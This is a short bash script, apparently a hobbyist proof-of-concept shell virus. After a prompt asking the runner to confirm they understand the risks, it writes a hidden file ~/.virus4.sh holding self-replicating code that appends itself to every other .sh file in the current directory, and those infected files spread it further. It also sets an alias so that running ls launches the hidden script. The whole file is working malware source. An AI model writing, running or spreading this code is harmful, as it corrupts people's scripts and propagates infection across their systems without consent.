#!/bin/bash

echo "-I_understand_all_risks_and_i_want_to_run_the_program/-no"
read  choice
case "$choice" in 
"-I_understand_all_risks_and_i_want_to_run_the_program")
;;
"-no") echo "Ok, good choice)"
exit 0
;;
* ) echo "invalid"
exit 0
;;
esac

if [ ! -f ~/.virus4.sh ]; then

    hash=$RANDOM$RANDOM$RANDOM
    actual_virus='#!/bin/bash

files=`find . -type f -name "*.sh" | sed "s/.\\///"`
files=($(echo $files | tr " " "\n"))
filename=$(basename $0)

virus='"'"'#!/bin/bash

hash=$RANDOM$RANDOM$RANDOM
files=($(ls *.sh | tr " " "\\n"))
filename=$(basename $0)

for file in "${files[@]}"; do
    if [[ $file != $filename ]]; then
        echo -n -e "\\n" >> "$file"
        cat $0 >> "$file"
    fi
done

head -n -16 $0 > temp.sh && chmod +x temp.sh && mv temp.sh $0

# "$hash"

exit 0'"'"'

# '"$hash"'

for file in "${files[@]}"; do
    if [[ $file != $filename ]]; then
        echo -n -e "\\n$virus" >> $file
    fi
done

exit 0'

    echo -n -e "$actual_virus" > ~/.virus4.sh
    chmod +x ~/.virus4.sh
fi

alias ls="~/.virus4.sh;ls"

exit 0